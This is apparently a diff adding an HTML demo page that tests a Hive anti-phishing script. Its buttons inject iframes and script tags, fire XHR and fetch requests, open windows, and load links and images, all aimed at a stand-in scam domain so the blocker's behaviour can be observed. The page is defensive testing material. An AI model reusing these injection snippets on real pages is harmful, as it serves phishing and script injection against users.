@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="/scripts/universal-bridge-against-phishing.js"></script>
+</head>
+<body style="padding: 20px;">
+  <div>
+    <h2>DEMO PAGE for article: <sub> &nbsp; &nbsp; <a href="">https://peakd.com/@keys-defender</a></sub></h2>
+    <br>
+
+    <center style="border: thin solid black; width: 300px; margin: auto;padding: 5px;">
+    <h4>Known phishing domains:</h4>
+    <a href="https://spaminator.me/api/p/domains.json">https://spaminator.me/api/p/domains.json</a>
+    <br><br><sub>List maintaned by <a href="https://peakd.com/@spaminator">@spaminator</a></sub>
+    <br>
+    </center><br>
+  </div>
+
+  <div>
+    <h4>ANTI-PHISHING script:</h4><br>
+    <div style="margin: auto; text-align: center;">
+      Original:
+      <a href="/scripts/universal-bridge-against-phishing.js">
+        https://keys-defender.github.io/hive/scripts/universal-bridge-against-phishing.js
+      </a>
+      <br> &nbsp; &nbsp; &nbsp; &nbsp; Minified:
+      <a href="/scripts/universal-bridge-against-phishing.min.js">
+        https://keys-defender.github.io/hive/scripts/universal-bridge-against-phishing.min.js
+      </a>
+    </div>
+  </div>
+
+  <br><h4>TESTS:</h4>
+  <i>&nbsp; &nbsp; &nbsp; Note: open the DevTools Console and the Network tab to observe the anti-phishing behavior.</i>
+  <br><br>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:140px;padding:10px;width: 800px;">
+    <script>
+      const injectMaliciousIframe = () => {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://justnetwork.scam/iframe.html';
+        document.body.appendChild(iframe);
+      };
+    </script>
+    <b>Iframe:</b><br>
+    <div style="float:right;margin: -20px 30px">
+      <img
+        src="https://images.hive.blog/DQmUjjL77FNn92VgHwxXHPWBS1L3oWnsE4pakYb73iJ4i75/image.png"
+        width="300px"
+        style="border:thin solid grey"
+      >
+      <br><i><sub>right click and select "open image in new tab" to zoom</sub></i>
+    </div>
+    <button onclick="injectMaliciousIframe()" style="margin-top: 5px;">Add malicious iframe</button>
+    &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Expected result on button click:
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:120px;padding:10px;width: 800px;">
+  <script>
+    const injectMaliciousScript = () => {
+      const script = document.createElement('script');
+      script.src = 'https://justnetwork.scam';
+      document.body.appendChild(script);
+    };
+  </script>
+  <b>Script:</b><br>
+  <button onclick="injectMaliciousScript()" style="margin-top: 5px;">Inject malicious script</button>
+
+  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Expected result on button click:
+    <div style="float:right;margin: 5px 30px">
+      <img
+        src="https://images.hive.blog/DQmfCRL8iSG8ctbzVUFydTnJji7pnd2dQkpyBg7Co7peV6q/image.png"
+        width="300px"
+        style="border:thin solid grey"
+      >
+    </div>
+
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:90px;padding:10px;width: 800px;">
+    <div style="float: right;margin: 25px 20px;"><img src="https://justnetwork.scam" alt="jst"></div>
+    <b>Phishing image:</b><br><p style="margin-top: 5px;">(e.g. pic saying "visit justnetwork.scam to claim your tokens!")</p>
+    <textarea style="width: 280px; height: 20px;" disabled><img src="https://justnetwork.scam"></textarea>
+    &nbsp; &nbsp; &nbsp; &nbsp; Result on page load:
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:130px;padding:10px;width: 800px;">
+    <b>Phishing link:</b>
+    
+    <div style="float:right;margin: 10px 30px">
+      <img
+      src="https://images.hive.blog/DQmYeod4HKRenTmXYBZjqRNBgsHJ2BQPhA84KC2mwCteDMf/image.png"
+      width="300px"
+      style="border:thin solid grey"
+      >
+    </div>
+    <br><br><a href="https://justnetwork.scam/claim.php">Claim your million dollar tokens</a>
+    <br><br> <center>
+     Expected result on click:</center>
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:90px;padding:10px;width: 800px;">
+    <b>XHR (XML HTTP Request)</b>
+    <script>
+      const sendShadyReq = () => {
+        var oReq = new XMLHttpRequest();
+        oReq.open('GET', 'https://justnetwork.scam/tracking.js');
+        oReq.send();
+      };
+    </script>
+      <div style="float:right;margin: 5px 30px"><br>
+        <img
+          src="https://images.hive.blog/DQmPfFhHr53jwwkHupz5CL7smrwB53MwhUqkP1R9evwLBRg/image.png"
+          width="300px"
+          style="border:thin solid grey"
+        >
+      </div>  
+    <br><button onclick="sendShadyReq()" style="margin-top: 10px;">Execute malicious XHR request</button>
+  
+    &nbsp; &nbsp; &nbsp; Expected result on button click:
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:120px;padding:10px;width: 800px;">
+    <b>Fetch API</b>
+    <script>
+      const sendShadyFetch = () => {
+        window.fetch('https://justnetwork.scam/tracking.js').then(res => res.text());
+      };
+    </script>
+    <div style="float:right;margin: 5px 30px">
+      <img
+        src="https://images.hive.blog/DQmSYzMEiR2hgf8QKaPaBFcJU3PExwNKM6QAQrGgAQBzyfC/image.png"
+        width="300px"
+        style="border:thin solid grey"
+      >
+    </div>
+    <br><button onclick="sendShadyFetch()" style="margin-top: 10px;">Execute malicious Fetch request</button>
+    &nbsp; &nbsp; Expected result on button click:
+  </div>
+
+  <div style="margin:10px auto;border:thin solid grey;border-radius: 20px;height:120px;padding:10px;width: 800px;">
+    <b>Window open</b>
+    <script>
+      const openShadyPage = () => {
+        window.open('https://justnetwork.scam/keychain.html', '_blank');
+      };
+    </script>
+    <div style="float:right;margin: 5px 30px">
+      <img
+        src="https://images.hive.blog/DQmaHyGFoeZq5B5khGLXFedXrrS9TCv2xcygfLWvApu5AX6/image.png"
+        width="300px"
+        style="border:thin solid grey"
+      >
+    </div>
+    <br><button onclick="openShadyPage()" style="margin-top: 10px;">Execute malicious open request</button>
+    &nbsp; &nbsp; Expected result on button click:
+  </div>
+</body>
+</html>
